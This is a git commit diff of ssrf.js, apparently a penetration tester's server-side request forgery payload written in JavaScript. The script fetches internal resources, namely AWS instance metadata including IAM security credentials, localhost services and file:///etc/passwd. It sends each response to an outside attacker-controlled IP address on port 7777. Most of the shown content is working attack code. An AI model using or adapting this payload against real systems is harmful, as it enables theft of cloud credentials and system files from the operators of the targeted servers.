eab5518bc8de15c81bd7d8f5f1c77f6256909ea8
immunitytester <mark@immunityinc.com>
2016-06-23 17:58:22 -0400

    Add files via upload

--- ssrf.js
+++ ssrf.js
@@ -3,26 +3,20 @@ function handler() {
   console.log(1);
   console.log(this);
   if(this.status == 200 && this.responseText != null) {
-    // success!
-      //do whatever you want
-      
       //xhr2.onreadystatechange = none; 
-
       var xhr2 = new XMLHttpRequest();
       xhr2.open("GET", 'http://192.241.169.35:7777/SSRF?u='+encodeURIComponent(this.responseText), true);
       xhr2.send();
-   
 
   } else {
     // something went wrong
-    console.log(this.statusText);
   }
 }
 
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = handler;
 
-var urls = ["http://169.254.169.254/latest/dynamic/instance-identity/document","http://169.254.169.254/latest/meta-data/iam/security-credentials/admins","http://localhost:3000","http://localhost:3000/1/catalogs","http://ifconfig.pro","http://192.241.169.35:7777/url5","file:///etc/passwd"];
+var urls = ["http://immunityinc.com","http://169.254.169.254/latest/dynamic/instance-identity/document","http://169.254.169.254/latest/meta-data/iam/security-credentials/admins","http://localhost:3000","http://localhost:3000/1/catalogs","http://ifconfig.pro","http://192.241.169.35:7777/url5","file:///etc/passwd"];
 var arrayLength = urls.length;
 for (var i = 0; i < arrayLength; i++) {
    try{
